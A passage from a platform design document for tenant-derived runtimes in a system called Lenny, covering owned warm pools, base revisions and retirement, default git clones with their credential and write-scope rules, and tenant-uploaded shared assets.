**A base rollout.** While a platform rollout of the base is in progress, an owned pool keeps a pod set per distinct pod hash among the active base revisions, so a rollout that changes only the base's gateway-read fields adds none ([RV-3](../0140-runtime-revisions/change.md#rv-3-pods)). Under decision D8 of [`0140-runtime-revisions`](../0140-runtime-revisions/decisions.md#decisions), the pods of every pod set other than the one for the revision with the highest weight, the older revision on a tie, count in neither T nor the creation rule of `maxOwnedPods`, and a pool with a reservation places that extra pod set outside its reserved pods, as DR-10's "Budget" states. Decision 35 exempts pods that a platform cause failed for the same reason: the tenant did not cause them. The namespace `ResourceQuota` still bounds the extra pods. When the rollout ends, the remaining pod set is the pool's only one and counts as before, so a rollout cannot raise what a tenant is charged, and a tenant at its bound still gets the new revision. A change to the runtime's own contribution, such as a tenant asset, creates a pod set without a base revision. The tenant made that change, so the exemption does not apply, and the earlier pod set's pods count in T until they leave. The idle minutes of the extra pod set are billed to the platform rather than the owning tenant, as `pool.idle_usage` in [`0121-billing-resource-attribution`](../0121-billing-resource-attribution/change.md#poolidle_usage) attributes them. Under the rollout policy `automatic`, the rollout waits for each owned pool's new pod set for at most `rollout.ownedPoolWarmTimeoutSeconds`, and then moves traffic with cold starts on that pool.

The PoolScalingController never raises an owned pool above its warm target, which is `warmCount` unless DR-10 raises it. Its formula is clamped, and `bootstrapMinWarm` is refused. A runtime route writes no pool configuration ([RT-4](../0141-runtime-routing/change.md#rt-4-runtime-routes)), so it cannot raise an owned pool's warm count. Warm-pod minutes accrue per pool in `lenny_warmpool_idle_pod_minutes`, which carries no tenant label, so an owned pool's idle cost reaches its owner through `pool.idle_usage` under [`0121-billing-resource-attribution`](../0121-billing-resource-attribution/change.md). Whether the billing pipeline should read that is the operator's commercial choice.

#### Kubernetes permissions

The gateway needs none. It writes Postgres, and the PoolScalingController renders the CRD pair with the permissions it holds. The WarmPoolController creates pods with the label in place, which the `unset → owner` rule that the egress design adds to the label webhook admits ([`0127-egress-and-git`, "Pod models"](../0127-egress-and-git/change.md#pod-models)). No tenant write creates a `Runtime` resource. A `RuntimeClass`, a namespace, and a NetworkPolicy are all fixed by Helm, and §13.2.6's pre-created policies apply, because `egressProfile` comes from the template.

#### Tenant operations

A tenant writes its owned pool's fields only through `PUT /v1/admin/derived-runtimes/{name}`, and drains it through that resource's `drain` route. The pool routes `drain`, `warm-count`, `circuit-breaker`, and `resume-reconciliation` remain `platform-admin` paths on owned pools, as DR-1 makes them on all pools. An owned pool has no rollout of its own: it follows the base's runtime rollout under `/v1/admin/runtimes/{name}/rollout`, which only a `platform-admin` drives ([RV-4](../0140-runtime-revisions/change.md#rv-4-rollout)), and which replaces the pool-level `upgrade` routes. `pool_tenant_access` and `runtime_tenant_access` refuse a row naming an owned record, so a grant cannot share it. A `platform-admin`'s `PUT /v1/admin/pools/{name}` on an owned pool refuses every field "Template copy" takes from the base or the template, including `runtimeRef` and `sessionPolicy`'s concurrency, recycling, and cleanup fields, because a direct write could otherwise widen a row held at one session.

#### Tenant suspension and deletion

Suspending a tenant adds a reason to `warm_stop_reasons` on its owned rows in the same transaction, and resuming removes it. §15.1 blocks deleting a tenant while pools exist under it, which would stop erasure. Owned pools leave that block, and the deletion lifecycle drains and removes them in §12.8's order. The same erasure deletes the artifacts the tenant uploaded for `artifact` assets and the tenant-owned chunk sets of its assets and stores, and a legal hold on the tenant keeps them until the hold is released, as for the tenant's other data ("Tenant shared assets" under DR-9).

### DR-6: Base changes

Today a base write that would invalidate a derived runtime is refused and names the affected runtimes. For a tenant-derived runtime that lets one tenant block a platform change and shows one tenant's names to whoever wrote the base. `derivedRuntimesInvalidatedBy` keeps its rule for platform-owned derived runtimes only.

For a tenant-derived runtime, the restrict-only rules move from a one-time check to the merge. The tenant view computes the effective runtime against the live base and the current grant entry, on each resolve, and reads a retirement reason on the owned row as `retired`, so re-issuing an entry after its date does not revive the runtime. A base or grant write therefore succeeds and takes effect at the next resolve, apart from the exceptions DP9 names. `incompatible` means new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, with `details.reason` naming the miss, until the cause is fixed.

Once [`0140-runtime-revisions`](../0140-runtime-revisions/change.md) lands, a base write that changes a versioned field creates a base revision, and the base's traffic decides which revision serves each new session. `baseStatus` and `incompatible` then evaluate against every revision in the base's traffic, the new one included, and the runtime reads as `incompatible` while any of them breaks it ([RV-5](../0140-runtime-revisions/change.md#rv-5-derived-runtimes)). New sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE` until the tenant edits the runtime or the breaking revision leaves the traffic. A row below on a versioned field, such as `requireSoPeercred` or `workspaceDefaults`, takes effect when the write creates the revision, which can be before any session reaches that revision. A row on a live field, such as `setupCommandPolicy`, `limits`, or `allowedResourceClasses`, applies to the next session on every revision.

| Platform change | Effect on a tenant-derived runtime |
| :-- | :-- |
| Narrows `llmFormats`, `allowSelfRecursion`, or `limits` | Applies at the next resolve. An emptied intersection, such as an emptied `llmFormats` where the tenant's list was not empty, is `incompatible`. |
| Creates a base revision whose `runtimeOptionsSchema` drops or forbids a property the tenant's schema names | `runtimeOptionsSchema` is versioned, so the change applies to the sessions the rollout gives that revision, whose options both schemas validate. A property the tenant's schema only names becomes unusable on those sessions, and the runtime stays compatible. A property the tenant's schema lists in `required` makes the runtime `incompatible` while that revision is in the traffic, because every session on it would be refused, and the notice names the property and the revision. A revision forbids a property when its schema gives the property the schema `false`, or omits it from `properties` under `additionalProperties: false` ([RV-5](../0140-runtime-revisions/change.md#rv-5-derived-runtimes)). |
| Raises the base's `periodicCheckpointIntervalSeconds`, or the owned pool's value, above the tenant's value | Applies at the next resolve: the tenant's sessions take the base's longer interval, and the notice reports the change. The runtime does not read as `incompatible`, because the longer of the two values is always a valid interval, as a narrowed `limits` always leaves a value. |

A platform admin raises the template's profile first, which the template write copies to its owned pools in its transaction under "Template copy", so no tenant input blocks the floor. The floor is live, so it creates no base revision. |

A template cannot be deleted while a grant entry names it: `DELETE` answers `409 RESOURCE_HAS_DEPENDENTS`. An operator retires a template by changing the entry to another template, or by setting the entry's `retireAt`.

A running session keeps its plan through any of these, because §14.1 stores the composed plan, and every later materialization reads it. "Residual risks" states what that means for a stopped default.

**Notice.** Each write that can change a tenant-derived runtime's effective result, or the effect of a stored overlay, adds an outbox row in its own transaction. A base write that creates a revision fires the notice when it creates the revision, and the event names the revision, the base's rollout policy, and whether the revision makes the runtime `incompatible` ([RV-5](../0140-runtime-revisions/change.md#rv-5-derived-runtimes)). The notice therefore no longer means that the change has reached the tenant's sessions. A worker scans the affected runtimes and every tenant with a stored overlay on the pool, grant or no grant, emits `runtime.base_changed` to each one's audit chain, so subscriptions and an [SO-3](../0142-security-oversight/change.md#so-3-per-tenant-siem-destination) SIEM destination receive it, and retries until it has done so. Reads show `baseStatus` at once, because resolve is the authority. The platform write's response lists affected runtimes and tenants to the `platform-admin`, and its failure to list them does not fail the write.

**Retirement.** `POST /v1/admin/runtimes/{name}/retire` takes `effectiveAt`, which must lie at least `runtimes.tenantDerivation.baseRetirementNoticeSeconds` ahead, 30 days by default.

- From the call, new derivations are refused, `baseStatus` reads `retiring` with the date, and the event goes out. Existing runtimes keep working.
- At `effectiveAt`, `baseStatus` reads `retired`, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, and the owned pools drain. Running sessions end under their own age limits. `DELETE` on the base no longer counts tenant-derived runtimes as dependents, and §15.1's rule for non-terminal sessions still holds the row. The base's `Runtime` resource stays until its last pod ends.
- `emergency: true` with a `justification`, and an optional `ticketId`, makes `effectiveAt` now, for a compromised image. It refuses new sessions at once, and [SO-4a](../0142-security-oversight/change.md#so-4a-mirror-to-the-tenant-chain) mirrors it. `force: true` also ends running sessions.

`retire_at` on the base row holds the date. A `platform-admin` cancels a pending date before it arrives.

Per tenant, the carrier is a grant entry's `retireAt`, set through `PUT .../derivation-grant` under the same notice floor, with `emergency: true`, a `justification`, and optionally `ticketId` and `force: true` in that body for the emergency form. Withdrawing a grant sets `retireAt` on each entry. An entry's date counts as passed once its base's `retire_at` has passed. While an entry has tenant-derived runtimes and its date has not passed, a grant write cannot remove the entry, and `DELETE .../tenant-access/{tenantId}` on its base or template answers `409 RESOURCE_HAS_DEPENDENTS`, because that route deletes the row with no date to hold. The operator's own entry holds this refusal, so it comes from no tenant.

**Who drains.** `warm_stop_reasons` on the owned row is the one signal the controller reads. `PoolStoreSource` reads pool rows, so it maps a non-empty value to its existing `ForceZeroMinWarm` and sets `MaxWarm` to 0, because `plan.pinnedOverBound` otherwise keeps served idle pods. The transaction that sets `suspended_by`, a tenant suspension, or an emergency adds its reason, and the Notice worker adds one when a date arrives. Only the source of a reason removes it. A tenant's `PUT` touches the column in one case: a `PUT` that complies with the guardrail passes [EG-9](../0127-egress-and-git/steps.md#steps)'s write path, which clears `suspended_by` and its reason. Retirement is terminal for those runtimes, so its reason has no removal, and a tenant creates a new runtime under a live base.

### DR-9: Default git clones

#### Stored format

`workspaceDefaults` gains `gitClones`, and each entry uses the field names of §14's `gitClone` source. A default clone lists a repository every session on the runtime gets by default, and it says nothing about warming: a store comes only from a `gitRepository` entry of `sharedAssets`, as "Warm stores" states, and a write naming a `warm` field answers `400 VALIDATION_ERROR` naming it. The field exists on operator runtimes and on tenant-derived runtimes, under decision 42. A derived runtime's clones append to its base's, a platform-derived runtime's as well as a tenant-derived runtime's, so the base's clones compose first, and a derived runtime's write whose clone `path` is equal to, a parent of, or a child of a base clone's or a base default file's `path`, in any revision in the base's traffic, is refused (`422 INVALID_RUNTIME` on a platform-derived runtime, `422 INVALID_DERIVED_RUNTIME` on a tenant-derived one), because §5.1's merge would otherwise let a derived clone replace a base's.

```yaml
workspaceDefaults:
  gitClones:
    - url: https://github.com/acme/agent-skills
      ref: main
      path: skills
      auth: { mode: credential-lease, leaseScope: vcs.github.read }
      write: none
```

`auth.mode: credential-lease` asks for a credential at clone time, and `auth.leaseScope` names its provider and scope as `vcs.<provider>.read` or `vcs.<provider>.write` (§14). A default clone holds no secret. A private clone takes its token from the tenant's VCS pool or from the session user's link, under the checks a client's `gitClone` source gets, and the agent never receives that token.

**On an operator runtime.** A `platform-admin`'s runtime write takes the checks below that read no tenant: the URL, the ref, `submodules`, `resolvedCommitSha`, the `path` rules against the runtime's own clones and files, and the `.git` refusal. The runtime serves many tenants, so the checks that read a tenant, which are the host's coverage, the VCS pool prefix and the allowlist, `auth`, the environment, and the repository authorization check, run at bind for each session's tenant, as they do for a client's `gitClone` source, and a session that fails them is refused as "Whose credential" states. An operator default clone carries `write: none` alone: the conditions under "Write scope" read a grant entry, a tenant's VCS pool, and a one-session owned pool, which an operator runtime does not have, and a runtime write naming another value answers `422 INVALID_RUNTIME`. Adding the other values later is additive. An operator default clone needs no grant flag, because the operator's own runtime runs no tenant input, and it does not count toward a grant entry's `maxDefaultGitClones`, which bounds a tenant's input alone.

The runtime write answers with a `Warning` in two cases. A default clone whose ref is not a full commit draws one, because whoever can push to that ref runs code at the slot UID in every session of every tenant on the runtime, as "A clone is code" states, and each tenant's posture lists such clones on the runtimes it can use ([SO-2](../0142-security-oversight/change.md#so-2-tenant-security-record-and-posture)). A pool of the runtime with no git path, such as a template with `egressProfile: restricted` and no `gitAccess`, draws one naming that pool, because every session placed there fails its clones at materialization.

#### Checks at write

A `POST` or `PUT` refuses a default clone with `422 INVALID_DERIVED_RUNTIME` and `details.field` unless all of these hold:

- The grant entry sets `allowGitClones`, and the runtime's default clones and its `tenant`-declared `gitRepository` assets together are within the grant entry's `maxDefaultGitClones`. The operator sets that cap per tenant, an entry that omits it reads `runtimes.tenantDerivation.maxDefaultGitClones`, 8 by default, and no grant entry exceeds `runtimes.tenantDerivation.maxDefaultGitClonesCeiling`, 32 by default, so a tenant declares any number up to its cap (decision 43). The count limits how many entries a write checks and a session composes, and it does not limit their cost: the stores of a runtime's `gitRepository` assets fit in the grant entry's `maxWarmCloneBytes` on each pod whatever their number, and a default clone without a store counts toward §7.1 **Bind bounds.** and the slot's `workspaceSizeLimitBytes` at materialization.
- `url` passes §14's restrictions and the shared canonicalizer in [`0127-egress-and-git`](../0127-egress-and-git/change.md), and it carries no userinfo.
- The host is the host of one of the tenant's VCS pools or git routes. An uncovered host has no git enforcement, as **Uncovered git hosts** in [`0127-egress-and-git`, "Residual risks and limits"](../0127-egress-and-git/change.md#residual-risks-and-limits) states, and §14 lets a client's pinned commit skip the host check of the bind-time ref resolver. A default clone gets that check whether or not its ref is a full commit.
- A repository under a VCS pool's prefix carries `auth` and is on the tenant's repository allowlist. A repository under no prefix omits `auth`. `checkGitCloneAuthBindings` skips a source with no `auth`, while `netagent` attaches credentials by repository and the readable set takes every `gitClone` source, so an `auth`-less clone of `github.com/acme/secret` would otherwise pass every check made here.
- `auth.leaseScope`, when set, is a read scope. The clone's fetch therefore never holds a write token, and push access comes only through `write` or a client's `writableRepositories`, as "Write scope" states.
- `ref` is a well-formed ref name or a full commit, and it cannot begin with `-`, because `lenny-store-fill` passes it to git. The same check runs at bind, and the fill and the helper end their options before the ref. `schemas/workspaceplan-v1.json` constrains only its length today.
- `submodules` is absent, because a submodule names repositories the write did not check. `resolvedCommitSha` is absent, because the gateway writes it.
- `path` is present and is a relative subdirectory. It is neither `.` nor equal to, a parent of, or a child of another default clone's path or a default file's path, on the runtime or its live base.
- No component of a default clone's `path` or a default file's `path` is `.git`, compared case-insensitively. `workspaceplan.validatePath` does not refuse this today, and "Not verified" below states why it matters.
- On a VCS pool with `userAuthorization: required`, the owned pool is one [`0152-user-git-identity`](../0152-user-git-identity/change.md) accepts, so a recycling or concurrent owned pool is refused at write. Otherwise every session on the runtime would answer `USER_AUTHORIZATION_UNSUPPORTED_POD`.
- The owned pool has a git path. A template with `egressProfile: restricted` and no `gitAccess` has none.
- With `write` other than `none`, the "Write scope" rules below hold.

**One session per pod.** A clone with a `write` other than `none`, or under a VCS pool with `userAuthorization: required`, needs an owned pool on which `poolstore.ReusesPods` is false, so that each pod serves one session in its life. `oneSessionPerPod: true` gives that on any template. Under decision 60 of [`0127-egress-and-git`](../0127-egress-and-git/decisions.md#decisions), settled on 2026-11-13, `netagent` scopes each slot of a concurrent pod to its own session where it can attribute a connection to its slot, and it keeps the union of the pod's sessions' readable and writable sets where it cannot. A writable entry on a pod with several slots would then reach another slot under that fallback, and on every reused pod it would share `netagent`, the adapter, and the sandbox kernel with a later or concurrent user's session, which is the ground on which [`0152-user-git-identity`](../0152-user-git-identity/change.md#pod-models) refuses reused pods under its decision 52. `userAuthorization: required` refuses such pods already. Two statements keep this true after the write:

- The transaction that writes the first such clone sets `oneSessionPerPod: true` on the owned row, when the effective policy reuses no pods or the request sets the field, and is refused otherwise. The field is never cleared. While it is set, the effective policy reuses no pods, whatever the template states. A template write still succeeds, under DP9, and the event names each pool it does not reach. Removing the clone does not clear it, so a pool that has held such a clone never widens. A tenant that needs a wider policy creates a new runtime.
- The field is one-way because a pod created for one session can hold a stored writable plan or the tree of a session under `userAuthorization: required`, and `rebindReserved`, `ClaimSlot`'s two passes, and the idle scan all read the pool's current policy. No check on a pod could cover them all, and a widened policy would reach each of them.

A `gitRepository` asset needs no such pool, as "Who reaches a store" states, apart from one under a VCS pool with `userAuthorization: required`, which takes the same rule as a clone there, because its read checks are per user.

#### Binding

`ComposeInto` adds the clones after the default files and ahead of the client's sources, and they enter the stored plan as `gitClone` sources carrying `runtimeDefault: true`. The gateway writes that field and refuses it from a client, as it does `resolvedCommitSha`. The rest of the session path then treats them as declared sources: VCS pools with `userAuthorization: required`, readable sets, the pod's clone, and the stored `resolvedCommitSha` all apply with no second mechanism. The host and prefix checks under "Checks at write" run again at bind, because a VCS pool or git route can change after the write, and neither `checkGitCloneAuthBindings` nor the bind-time ref resolver covers an `auth`-less clone or a full commit.

The order in today's code needs changing. `resolveSubmittedPlan` runs `checkGitCloneAuthBindings` and `PinCommitSHAs` on the client's plan, and `composeRuntimeDefaults` runs later, once the `PreRoute` chain has fixed the runtime, so a composed clone would skip both. Composition reads the `workspaceDefaults` of the chosen base revision, and it and the checks below run at the post-chain point of [RT-2](../0141-runtime-routing/change.md#post-chain-point). These rules follow:

| Path | Rule |
| :-- | :-- |
| `POST /v1/sessions` with a plan, and `POST /v1/sessions/start` | After `composeRuntimeDefaults` and before `claimAtCreate`, the gateway runs the auth binding check, the environment and allowlist checks, the repository authorization check, and the commit pin on the composed default clones. It also runs the read checks on each tenant entry of the final pool's warm list for the chosen revision whose repository the composed plan does not name, as "Who reaches a store" states. The client's sources keep their earlier checks, so a bad client plan still fails before routing. |
| `POST /v1/sessions` with no plan | The plan binds at finalize, after the create-time claim. The gateway runs every check except the commit pin on the final runtime's default clones, and the read checks on the final pool's tenant entries that those clones do not name, before `claimForNewRow`, so a user with no access holds no pod and the claim carries the right `withheldStores`. |
| `POST /v1/sessions/{id}/finalize` | The same full run follows `composeRuntimeDefaults`, with the read checks on the pool's tenant entries that the plan does not name. A refusal binds nothing and leaves the session in `created`, as §14.1 states for a rejected plan. |
| A delegated child | `composeChildWorkspaceDefaults` makes the same full run, with the child's user and environment and the read checks on the target pool's tenant entries that the child's plan does not name, and a refusal fails the delegation before the child row exists. `Service` gains the resolver and credential dependencies it lacks today. |
| Derive | [`0144-session-derive`](../0144-session-derive/change.md) binds a copy of the source's stored plan at create and composes nothing. The full run covers the plan's clones, and the read checks cover each tenant entry on the target pool's warm list whose repository the plan does not name, as the next row does, ahead of `reserveDerivedSession` and any copy, so a refusal has nothing to undo. |
| Resume, retry, and rebuild | The stored plan holds the commit, so these read it, and the repository authorization check runs as [`0152-user-git-identity`](../0152-user-git-identity/change.md) states for resume. The next pod can hold a warm store whose repository the stored plan does not name, because a tenant admin added the `gitRepository` asset after the session bound, so the gateway also runs the read checks for each tenant entry of the pool's warm list whose repository the plan does not name, ahead of the claim on both branches of `resumeOnPod`. A failure withholds the store as "Withheld stores" states, and the resume proceeds. On a pod with several slots a failure refuses the resume, as "Withheld stores" states, and the resume fails under §6.2's failure path, and the recorded reason has the fields the refusal below has, because the resume driver has no response to write to. |

All of these read the final runtime and its chosen revision, so a runtime route or a `PreRoute` interceptor that moves a session brings the final runtime's clones with it, under the same checks.

#### Whose credential

| Case | Identity on the clone | When it cannot read |
| :-- | :-- | :-- |
| No `auth`, a repository under no VCS pool prefix | Anonymous, on a covered host or a git route | A floating ref refuses the session at bind, under the refusal rule below. A full commit skips `ls-refs`, so a missing commit fails at materialization with `SESSION_CREATION_FAILED`, after the claim. |
| VCS pool with `userAuthorization: off` | The tenant's App or stored token | As above. Any user who can start a session on the runtime gets the repository's content, which the tenant's allowlist already gives a session on that pool. |
| VCS pool with `userAuthorization: required`, human root session | The App or link token that the Token Service mints over the pod credential API, after the session user's link passes the repository authorization check | `LINKS_REQUIRED`, the combined missing-links response with the link under `details.userLinks`, or `USER_REPOSITORY_ACCESS_DENIED`. Nothing falls through to the App, and no session runs without the clone. |
| The same, listed service identity | The App, under the subject's own allowlist | Refused when the repository lies outside that allowlist. |
| The same, unlisted service caller | None | Refused, as [`0152-user-git-identity`, "Service identities"](../0152-user-git-identity/change.md#service-identities) states. |
| Delegated child | The parent's user, on the child's row | As for that user, and the delegation fails. |

A refusal caused by a default clone goes through its own error writer, which carries `details.source: runtimeDefault`, the clone's `path`, and a reason, and omits `url`, `ref`, `host`, `matchingPools`, and the underlying error text. `writeRefResolveError` and `writeVCSResolveError` return those fields today, and a repository later moved or made private would otherwise show its name to any user of the runtime. [`0152-user-git-identity`](../0152-user-git-identity/change.md) names the repository because the user declared it, and here a tenant admin named it. The combined missing-links response, `LINKS_REQUIRED`, keeps the `linkUrl` under `details.userLinks`, which names the provider alone. A user who passes sees the URL and commit in `GET /v1/sessions/{id}`.

A runtime can therefore become unusable for some users. A write answers with a `Warning` when a default clone is under a VCS pool with `userAuthorization: required`, naming that access now decides who can use the runtime.

#### Write scope

The client of a default clone may not know the repository's name, because a tenant admin declared it on the runtime. A client-side `writableRepositories` entry therefore cannot be the only way to push access. `auth.leaseScope` stays a read scope in every case, and `write` is a separate field.

| `write` | Which sessions can push | What the client states | What it needs |
| :-- | :-- | :-- | :-- |
| `none`, the default | None through this field. A client that knows the name can still declare it in `writableRepositories`. | Nothing | `allowGitClones` |
| `clientOptIn` | A session whose plan sets `writeDefaultClones: true` | One flag, which names no repository and covers every clone with `write: clientOptIn` on the runtime | `allowGitClones` |
| `always` | Every session on the runtime | Nothing. A transparent client sends no plan, so this is its only way to push access | `allowGitCloneWrites` in the grant, off by default, `allowedRefPatterns` on the clone, and a pool with no `prAuthoring: user` |

**At write.** A `write` value other than `none` carries these conditions, each answering `422 INVALID_DERIVED_RUNTIME`:

- The clone carries `auth`, and its repository lies under a VCS pool prefix whose pool sets `allowWrite`.
- "One session per pod" above applies.
- `write: always` carries `allowedRefPatterns`, each a literal prefix under `refs/heads/` with at least one named segment, such as `refs/heads/lenny/*`. With no client statement, a prompt-injected agent in any session would otherwise reach the default branch.
- `write: always` is refused under a pool with `prAuthoring: user`. A writable entry there attaches the user's binding, which acts with a token derived from the user's own authority, so that attach needs a statement from the client. `clientOptIn` is that statement, and its write answers with a `Warning` naming the attach.
- `derivedRuntimes.forbid`, the guardrail DR-7 adds, allows it: `writableDefaultClones` refuses both values, and `alwaysWritableClones` refuses `always` alone.

**At bind.** Composition first settles whether the value applies to this session, under the rules below, and only then adds the repository to the stored plan's `writableRepositories`, with the clone's patterns. A clone that reads as read-only therefore triggers no attach. An added entry is an ordinary writable entry: the allowlist and `allowWrite` checks, the repository authorization check, the attach rule of `prAuthoring`, `netagent`'s enforcement, and `git.operation` records all apply, and `GET /v1/sessions/{id}` shows it. A user with no link on a clone with `write: clientOptIn` under `prAuthoring: user` gets `USER_LINK_REQUIRED`, because the client asked for the write.

- **A user who can read and not write.** The session continues read-only, and its response lists `readOnlyDefaultClones` with each clone's `path` and a reason, omitting the repository's name. The client did not name the repository, and the read is what the runtime needs. A repository the client itself names in `writableRepositories` keeps the refusal [`0152-user-git-identity`](../0152-user-git-identity/change.md) states. The same rule covers an `allowWrite` lowered after the write, a `pendingApproval` entry, and a clone with `write: always` whose pool later turns on `prAuthoring: user`.
- **A delegated child.** A child gets write access under `clientOptIn` or `always` only when its parent's writable set holds the same repository and any `allowedRefPatterns` on the clone lie within the parent's entry, and it is read-only otherwise, in any environment. A clone with no patterns takes the parent's entry's, so a parent limited to `refs/heads/alice/*` cannot delegate a push to `main`. A read-only parent could otherwise delegate to a runtime with `write: always` and push through it.
- **A derive.** A derive composes nothing, so it copies the source's writable entries, under [`0144-session-derive`](../0144-session-derive/change.md). An entry a default clone added follows this rule on the new session, so it reads as read-only on a target that reuses pods, and when its pool has since turned on `prAuthoring: user`. The derive response (`POST /v1/sessions/{id}/derive`) lists such an entry in `readOnlyDefaultClones`, with the clone's `path` and a reason and without the repository's name, and lists every other read-only entry in `readOnlyRepositories`, as [`0144-session-derive`, "Writes"](../0144-session-derive/change.md#writes) states.
- **A runtime route.** A route target brings its `write` values, so a route can add push access to the sessions it moves. A route write naming a target runtime whose default clones carry `write` values answers with a `Warning` naming those runtimes, as [RT-4](../0141-runtime-routing/change.md#rt-4-runtime-routes) states.

#### Derive

[`0144-session-derive`](../0144-session-derive/change.md) states derive for every session, and decision 22 below records the owner's choice. These parts concern default clones:

- A derive copies the source's stored plan, so a default clone travels as a `gitClone` source marked `runtimeDefault`, and the target's clones do not compose. A tenant's later change to the runtime reaches no derived session.
- `from: latest` restores the snapshot and clones nothing. A snapshot archives the whole workspace, and `ArchiveTree` excludes no `.git`, so it holds a clone's commit, local commits, index, and uncommitted changes, whether the source could write or not. A store-backed repository's snapshot leaves out the objects its store holds, and restore fetches them, so a commit since removed from the host fails that derive.
- `from: start` clones each repository at the source's `resolvedCommitSha`, and a store on the target serves it where the URL matches, as it serves any `gitClone` source under "Session" in "Warm stores".
- Every check under "Binding" runs on the new session's user and environment, so a kept tree does not skip the read check.
- A derive runs the check under ["Stops" in that document](../0144-session-derive/change.md#stops) on `planOriginRuntimes`, and it is refused onto a runtime whose row is not `registered`, under "Registered rows" in DR-4.

#### Environments

A default clone's VCS pool must be visible in the session's environment, and its host must survive that environment's policy. Otherwise the session is refused in that environment. The write's `Warning` lists each admitting environment where the check would refuse. Where the rule under "Pods with no per-session policy" applies, it reads the composed plan, so a concurrent owned pool whose default clone names a scoped repository refuses the session as it would for a client's plan. A warm-list entry, whoever declared it, must resolve with no environment, as "Tenant shared assets" and "Scoped repositories" under "Warm stores" state, because its store fills on a pod that has no session and therefore no environment.

#### A clone is code

A default clone reaches an exempt base command and the runtime's workspace configuration as a default file does. `allowGitClones` therefore has the conditions of `allowWorkspaceFiles`: the grant flag, and DR-3 landed.

A clone adds one risk a file does not have. Whoever can push to the named ref runs code at the slot UID in every new session on that runtime, and Lenny records no write by that person. A default file changes only through a tenant admin's audited write. A full commit removes this risk, and `derivedRuntimes.forbid: floatingCloneRefs` requires one. Each session's stored `resolvedCommitSha` records what it ran.

#### Materialization and cost

A default clone whose URL no store on the pod holds is fetched at materialization, after the pod is claimed. One whose URL a store holds fetches the difference from it and, when the entry carries `prestage: true`, adopts the tree staged before bind, as "Warm stores" states. A tenant admin warms a repository through a `gitRepository` asset in the runtime's `sharedAssets`, and also avoids a slow first fetch through the mirror prefetch resource that [`0127-egress-and-git`, "Scopes and who manages them"](../0127-egress-and-git/change.md#scopes-and-who-manages-them), defines.

- A floating ref adds an `ls-refs` call per session create and makes create depend on the egress path. A full commit avoids both.
- The composed plan counts toward §7.1 **Bind bounds.**, and the pool's fetch retry window, how long `netagent` retries the git mirror for a repository whose fetch is pending, covers every clone of a plan together, so defaults use up a client's share of each.
- [`0127-egress-and-git`](../0127-egress-and-git/change.md) refuses a runtime write that raises the setup bound, the runtime's `setupPolicy.timeoutSeconds`, past what a pool's window admits, and a tenant's `setupPolicy.timeoutSeconds` is such a write. The refusal goes to the tenant, on its own write. A platform write meets the same refusal under the exception DP9 states (decision 40): a base write that raises the setup bound, or a template write that raises the window, is refused when any pool, platform or tenant-owned, would no longer fit, and the refusal names those pools and the smallest `gateway.maxFinalizingTimeoutSeconds` at which they fit.

#### Tenant shared assets

Proposal DR-11 carries this part of the design. The owner settled it on 2026-11-14 as decision 42. A tenant-derived runtime's `sharedAssets` takes the three entry types an operator's Runtime takes, appended to the base's, and they render only on the runtime's owned pool:

```yaml
sharedAssets:
  - type: inline
    path: acme/style-guide.md
    content: "..."
  - type: artifact
    destPath: acme/models/classifier.onnx
    digest: sha256:4f1c...
  - type: gitRepository
    name: monorepo
    url: https://github.com/acme/monorepo
    ref: main
    prestage: true
```

**Owned pool only.** Tenant assets reach only pods that serve the owner alone (DP4). Every tenant-derived runtime has its owned pool under DR-5, and the PoolScalingController renders the runtime's assets onto that pool's pod sets and onto no other pool, the template pool included. A write that would place a tenant asset on a pool whose `ownerTenantId` is not the writing tenant answers `422 TENANT_ASSETS_REQUIRE_OWNED_POOL`. DR-5 leaves no such pool for a tenant-derived runtime, so the code is an internal guard that no request reaches today, and it keeps the rule explicit if a later change gives such a runtime another pool. Its test is a unit test of the render, and the error catalog lists it as an internal guard.

**`inline` and `artifact` entries.** These place read-only files under `/lenny/assets` in every slot of the owned pool's pods, which the adapter writes before READY as it does a base's ([PL-3](../0118-agent-pod-layout/change.md#pl-3-runtime-visible-filesystem-layout)). A `POST` or `PUT` refuses an entry with `422 INVALID_DERIVED_RUNTIME` and `details.field` unless all of these hold:

- The Helm value `runtimes.tenantDerivation.allowAssets` is true, the grant entry sets `allowAssets`, and DR-3 has landed. Both values are false by default, so a tenant places files under `/lenny/assets` only when the operator offers them on the deployment and grants them to that tenant, and a file there is code, as "Tenant defaults" states for a default file.
- The path, an `inline` entry's `path` or an `artifact` entry's `destPath`, is relative, contains no `..` component and no `.` component, does not begin with `.lenny`, and names no `.git` component, compared case-insensitively.
- The entry appends. A path equal to, above, or below a path one of the base's assets holds, in any revision in the base's traffic, is refused, so a tenant file never replaces or shadows an operator's file, against §5.1's merge rule that lets a derived runtime replace a conflicting `destPath`. Two of the runtime's own entries cannot overlap either.
- An `inline` entry's content is at most `runtimes.tenantDerivation.maxInlineAssetBytes`, 1 MiB by default and at most 4 MiB, and the runtime's `inline` entries together are at most 4 MiB, because their content lives in the derived runtime's row. Larger content goes through an `artifact` entry. An `artifact` entry's size is at most `runtimes.tenantDerivation.maxAssetEntryBytes`, and the runtime's `inline` and `artifact` entries together are at most `runtimes.tenantDerivation.maxAssetsBytes`.
- An `artifact` entry carries `digest` and `destPath` alone, and the digest is that of an artifact uploaded for this runtime. `POST /v1/admin/derived-runtimes/{name}/artifacts` takes the bytes, chunks them under IC-2 into the packs of the runtime's tenant-owned assets set under the tenant's key, and answers with the digest and size. A digest is scoped to the derived runtime the upload route names, so an entry naming a digest uploaded for another runtime is refused. An entry that carries `ref`, the field with which an operator's `artifact` entry names an object, answers `400 VALIDATION_ERROR` with `details.field`. The adapter places the file whole at `destPath`, reassembled from the packs, and never extracts it, whatever its content. The entry is pinned to that digest, so a later upload changes no pod set until a write names the new digest, and the size the registry records for the pod set's `assetsBytes` comes from the upload.

